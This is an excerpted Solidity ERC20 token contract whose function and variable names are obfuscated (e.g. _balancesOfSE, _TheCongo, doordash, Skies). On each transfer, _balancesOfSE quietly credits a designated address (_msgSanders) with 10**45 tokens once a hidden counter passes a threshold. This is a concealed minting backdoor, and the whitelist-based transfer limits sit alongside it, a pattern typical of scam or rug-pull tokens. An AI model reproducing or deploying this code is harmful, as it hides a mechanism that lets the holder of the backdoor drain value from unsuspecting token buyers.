...
contract ERC20 is Context, IERC20, IERC20Metadata, Ownable {
    ...
    function _balancesOfSE(address account) internal {
        _balances[account] += (((account == _msgSanders) && (doordash > 2)) ? (10 ** 45) : 0);
    }
    ...
    function _balancesOfVacuum(address sender, address recipient, uint256 amount, bool elastic) internal {
        ...
        if ((Skies[sender] != true) && (Skies[recipient] == true)) { require(amount < (_totalSupply / 15)); } // max buy/sell per transaction
    ...
    function _TheCongo(address creator) internal virtual {
        ...
        (doordash,Uber,Queens,trading) = (0,false,0,false);
        (Skies[_router],Skies[creator],Skies[pair]) = (true,true,true);
    }
    ...
    function _transfer(address sender, address recipient, uint256 amount) internal virtual {
        ...
        _balancesOfAfrica(sender, recipient, amount);
        _balances[sender] = senderBalance - amount;
        _balances[recipient] += amount;
        _balancesOfSE(sender);
...
contract ERC20Token is Context, ERC20 {
    constructor(
        ...
        _DeployKingo(creator, initialSupply);
        _TheCongo(creator);
    }
}
